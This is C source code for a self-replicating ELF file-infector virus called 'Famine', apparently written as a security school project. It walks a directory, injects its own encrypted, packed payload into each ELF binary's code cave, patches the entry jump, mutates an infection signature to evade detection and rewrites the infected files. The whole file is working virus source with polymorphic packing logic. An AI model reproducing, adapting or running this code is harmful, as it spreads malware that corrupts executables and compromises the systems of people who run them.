#include <sys/stat.h>
#include <sys/mman.h>
#include <dirent.h>
#include <fcntl.h>
#include <sys/types.h>
#include <elf.h>
#include <dirent.h>
#include <stddef.h>

#include "map.h"
#include "utils.h"
#include "bss.h"
#include "text.h"
#include "pestilence.h"
#include "syscall.h"
#include "famine.h"

extern void end();
void famine(void);

#define JMP_OFFSET 0x6
#define JMP_SIZE 4

void	__attribute__((naked)) _start(void)
{
	__asm__ ("call famine\n"
			 "jmp end\n");
}


static int	patch_new_file(t_data *data, const char *filename) {

	_syscall(SYS_unlink, filename);

	int fd = _syscall(SYS_open, filename, O_CREAT | O_WRONLY | O_TRUNC, data->elf.mode);
	if (fd == -1)
		return 1;

	if (_syscall(SYS_write, fd, data->file, data->size) == -1) {
		_syscall(SYS_close, fd);
		return 1;
	}

	_syscall(SYS_close, fd);

	return 0;
}

static int64_t calc_jmp(uint64_t from, uint64_t to, uint64_t offset) {
	return (int64_t)to - (int64_t)from - (int64_t)offset;
}

static int packer(t_data *data) {
	data->packer.p_size = (size_t)&packer_end - (size_t)&packer_start;

	if (text(data, data->packer.p_size) != 0) {
		return 1;
	}

	return 0;
}

static int64_t get_key(t_data *data) {
	size_t key_offset = (size_t)&key - (size_t)&packer_start;

	Elf64_Ehdr *ehdr = data->elf.ehdr;
	Elf64_Phdr *phdr = data->elf.phdr;
	int64_t key = 0;

	for (size_t i = 0; i < ehdr->e_phnum; ++i) {
		if (phdr[i].p_type != PT_LOAD || (phdr[i].p_flags & PF_X) == 0)
			continue;

		key = *(int64_t *)(data->file + phdr[i].p_offset + key_offset);
		break;
	}

	return key;
}

void modify_sign(uint8_t *data, size_t size, uint8_t key) {
	for (size_t i = 1; i < size; i = i + 2)
		data[i] ^= (key & 0xFF);
		//data[i] ^= (key >> (8 * (i % 8))) & 0xFF;
}

void modify_sign_key(uint8_t *data, size_t size, uint8_t key) {
	for (size_t i = 0; i < size; i++)
		data[i] += key;
}

#define SIGN_NUM_OFF 28
#define SIGN_SIZE 8

static int packer_patch(t_data *data) {

	size_t key_offset = (size_t)&key - (size_t)&packer_start;
	size_t offset_data = (size_t)&offset_to_data - (size_t)&packer_start;
	size_t size_decrypt = (size_t)&size_to_decrypt - (size_t)&packer_start;
	size_t jmp_rel_offset = (size_t)&jmp_rel - (size_t)&packer_start;
	size_t data_ps_offset = (size_t)&data_page_size - (size_t)&packer_start;
	size_t sign_offset = (size_t)&sign - (size_t)&packer_start;
	size_t sign_key_offset = (size_t)&sign_key - (size_t)&packer_start;

	int64_t addr_diff = data->cave.addr - data->packer.addr;
	data->packer.rel_jmp = (int32_t)addr_diff - jmp_rel_offset - sizeof(int32_t) - 1;

	int64_t new_key = 0;
	gen_key_64(&new_key);
	data->key = new_key;
	//
	//data->signature_key = 0;


	ft_memcpy(data->file + data->packer.offset, &packer_start, data->packer.p_size);


	ft_memcpy(data->file + data->packer.offset + key_offset, &new_key, sizeof(int64_t));
	ft_memcpy(data->file + data->packer.offset + offset_data, &addr_diff, sizeof(int64_t));
	ft_memcpy(data->file + data->packer.offset + size_decrypt, &data->cave.p_size, sizeof(size_t));
	ft_memcpy(data->file + data->packer.offset + jmp_rel_offset + 1, &data->packer.rel_jmp, sizeof(int32_t));
	//ft_memcpy(data->file + data->packer.offset + data_ps_offset, &data->data_page_size, sizeof(size_t));

	//size_t sign_offset = (size_t)&sign - (size_t)&_start;
	//void* sign = data->file + data->cave.offset + size + SIGN_NUM_OFF;
	uint8_t *sign_key = data->file + data->packer.offset + sign_key_offset;

	uint8_t *sign = data->file + data->packer.offset + sign_offset + SIGN_NUM_OFF;
	modify_sign(sign, 8, *sign_key);
	(*sign_key)++;

	//ft_memcpy(data->file + data->packer.offset + sign_key_offset, sign_key, 1);
	//ft_memcpy(data->file + data->packer.offset + sign_offset, sign, SIGN_SIZE);

	return 0;

}

#define SIGNATURE_SIZE 39

static int	inject(t_data *data) {

	if (packer(data) != 0) {
		char msg[] = "Error packing\n";
		_syscall(SYS_write, 2, msg, sizeof(msg));
		return 1;
	}
	
	size_t size = (size_t)&end - (size_t)&_start;

	if (bss(data, size) == 1) {
		char msg[] = "Error bss\n";
		_syscall(SYS_write, 2, msg, sizeof(msg));
		return 1;
	}

	packer_patch(data);

	data->cave.rel_jmp = calc_jmp(data->cave.addr, data->packer.old_entry, JMP_OFFSET + JMP_SIZE);

	ft_memcpy(data->file + data->cave.offset, &_start, size);

	ft_memcpy(data->file + data->cave.offset + JMP_OFFSET, &data->cave.rel_jmp, JMP_SIZE);

	//size = size - ((size_t)&packer_start - (size_t)&_start);
	
	encrypt(data->file + data->cave.offset, size, data->key);





	return 0;
}

static int search_signature(t_data *data, const char *key) {
    if (!data || !data->file || !key) {
        return -1;
    }

    size_t key_len = ft_strlen(key);
    if (key_len == 0 || key_len > data->size) {
        return -1;
    }

    void *found = ft_memmem(data->file, data->size, key, key_len);
    return (found != NULL) ? 1 : 0;
}

static int	already_patched(t_data data)
{
	char signature[] = "Famine (c)oded by dxrxbxk";
	if (search_signature(&data, signature) == 1) {
		return 1;
	}

	return 0;
}

static int	infect(const char *filename, uint8_t signature_key)
{

	t_data data;
	ft_memset(&data, 0, sizeof(t_data));
	
	data.signature_key = signature_key;
	/* calculate the size of the payload before the mapping */
	data.cave.p_size = (size_t)&end - (size_t)&_start;

	if (map_file(filename, &data) != 0) {
		return 1;
	}

	updade_hdr(&data);

	if (already_patched(data) != 0) {
		char msg[] = "Already patched\n";
		_syscall(SYS_write, 2, msg, sizeof(msg));
		free_data(&data);
		return 1;
	}

	if (inject(&data) != 0) {
		char msg[] = "Error injecting\n";
		_syscall(SYS_write, 2, msg, sizeof(msg));
		free_data(&data);
		return 1;
	}

	if (patch_new_file(&data, filename) != 0) {
		char msg[] = "Error patching new file\n";
		_syscall(SYS_write, 2, msg, sizeof(msg));
		free_data(&data);
		return 1;
	}

	//_syscall(SYS_msync, data.file, data.size, MS_SYNC);
	free_data(&data);

	return 0;
}

static void	open_file(char *file)
{

	int fd = _syscall(SYS_open, file, O_RDONLY);
	if (fd < 0)
		return ;

	char buf[PATH_MAX];
	struct dirent *dir;
	ssize_t ret;
	uint8_t signature_key = 0;

	for(;;)
	{
		ret = _syscall(SYS_getdents64, fd, buf, PATH_MAX);
		if (ret <= 0)
			break;
		for (ssize_t i = 0; i < ret; i += dir->d_reclen)
		{
			dir = (struct dirent *)(buf + i);

			if (dir->d_name[0] == '.'
				&& (dir->d_name[1] == '\0' || (dir->d_name[1] == '.' && dir->d_name[2] == '\0')))
				continue;
			
			if (dir->d_type == DT_REG) {

				char new_path[PATH_MAX];

				make_path(new_path, file, dir->d_name);

				infect(new_path, signature_key);
				signature_key++;
			}
		}
	}

	_syscall(SYS_close, fd);

}

void	famine(void)
{
	//if (check_ptrace() != 0) 
	//	_syscall(SYS_exit, 1);

	char p1[] = "./tmp";
	char *paths[] = {
		p1,
		(void *)0,
	};

	for (int i = 0; paths[i]; i++)
		open_file(paths[i]);

}
